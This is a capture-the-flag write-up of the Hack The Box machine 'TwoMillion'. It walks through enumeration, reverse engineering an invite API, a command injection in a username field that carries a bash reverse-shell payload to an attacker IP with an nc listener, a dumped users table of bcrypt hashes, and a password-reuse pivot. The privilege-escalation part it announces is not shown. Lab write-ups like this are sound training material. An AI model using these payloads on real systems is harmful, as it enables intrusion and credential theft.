---
title: "TwoMillion"
date: 2025-10-12 12:00:00 +0300
categories: [Writeups, HTB Boxes]
tags: [hackthebox, ctf, writeup, pentesting, security]
description: "HTB API endpoint reverse engineering, invite code generation, web command injection, and OverlayFS root privilege escalation."
image:
  path: /assets/img/posts/two-million.png
  alt: TwoMillion
---

# Enumeration

## Nmap

```jsx
└─$ nmap -A twomillion.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 12:35 EDT
Nmap scan report for twomillion.htb (10.10.11.221)
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   141.62 ms 10.10.14.1
2   140.98 ms twomillion.htb (10.10.11.221)

```

## Web Crawling

in the invite, there is a js file that obfuscated. when we deobfuscate it we get:

```jsx
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}

```

second function seems interesting. lets go further in it

```jsx
	└─$ curl -X POST http://2million.htb/api/v1/invite/how/to/generate 
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}  
```

![image.png](/assets/img/writeups/twomillion_image_38.png)

so, we try that

```jsx
$ curl -X POST http://2million.htb/api/v1/invite/generate        
{"0":200,"success":1,"data":{"code":"NlEzU00tSkNNVDEtQkdIVEctREhSQ1c=","format":"encoded"}}                        
```

getting value a bit cleaner

```jsx
                                                                this below refers to json parameters
└─$ curl -X POST http://2million.htb/api/v1/invite/generate | jq .data.code -r | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    91    0    91    0     0    150      0 --:--:-- --:--:-- --:--:--   150
FDN5R-PJKN0-KRNEO-1YAG4          

```

![2025-10-14_05-23.png](/assets/img/writeups/twomillion_2025-10-14_05-23.png)

![image.png](/assets/img/writeups/twomillion_image_39.png)

![image.png](/assets/img/writeups/twomillion_image_40.png)

detected code injection vulnerability

![image.png](/assets/img/writeups/twomillion_image_41.png)

we execute:

```jsx
"username":"$(bash -c 'bash -i >& /dev/tcp/10.10.15.9/9001 0>&1')"
```

and 

```jsx
nc -lvnp 9001
```

![image.png](/assets/img/writeups/twomillion_image_42.png)

![image.png](/assets/img/writeups/twomillion_image_43.png)

![image.png](/assets/img/writeups/twomillion_image_44.png)

```jsx
MariaDB [htb_prod]> select * from users;
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| id | username     | email                      | password                                                     | is_admin |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| 11 | TRX          | trx@hackthebox.eu          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
| 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |        1 |
| 13 | bob          | bob@2million.htb           | $2y$10$X2qJWXRTwKvQN2dNsz6oZOutuwrdQkAKu9ClWjtrUo73gZy85eQaq |        1 |
| 14 | test         | test@test.com              | $2y$10$HFfCXtn2HXEidO9m8SE0NOL75NH.Xi.62gd508Su1Yfp68Rok2UMC |        0 |
| 15 | test1111     | test1111@test.com          | $2y$10$..oRWFQK9CI/OTUhZW.gzesGgYCm58HedZ9DQefKccxpKXs4zJily |        0 |
| 16 | test2        | test2@2million.htb         | $2y$10$2kg/Bje85HFrcuhRJsB6tO05K95bxzD87.MA15lU/icd61pbPnPCS |        0 |
| 17 | pr0x1mo      | pr0x1mo@email.com          | $2y$10$vvT5f5zcx/e8WBp8oSZYuu2wh0oX/d5jkPdjMjw3lKFUMesQxOjyK |        0 |
| 18 | xmas         | xmas@email.com             | $2y$10$1wNSnyTzMgCrPLRXN9jmAe3K89hPhhJvqVXK9rMtoEOE9F51E7a7u |        0 |
| 19 | avi          | avi@2million.htb           | $2y$10$xll3hC0nJ8IW125M0YBBFeODTTGC495prHxVC3O97fklC7wV2Fk0. |        1 |
| 20 | bbeeckman    | bbeeckman@gmail.com        | $2y$10$2MYaMJ1cCkQmUr3ga.OzYuAes.oZaieYU2f.oq7l3ovSMuAUl1SZq |        1 |
| 21 | omerfaruk    | omerfaruk@admin.com        | $2y$10$0Q45s.EfnHLMc4hqhuPdx.X/zLisal8KADaW0jbqlymvmPn2StUO2 |        1 |
+----+--------------+----------------------------+--------------------------------------------------------------+---

```

there was bruteforcing but we cant find it. but we have  db password, trying for ssh this time

```jsx
www-data@2million:~/html$ su - admin
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@2million:~$ 
```

for what can be accessible with admin we do :

```jsx
find / -user admin 2>/dev/null 
```

for extra detail we exclude several file names

```jsx
find / -user admin 2>/dev/null | grep -v '^/run\|^/proc\|^/sys'
```

![image.png](/assets/img/writeups/twomillion_image_45.png)
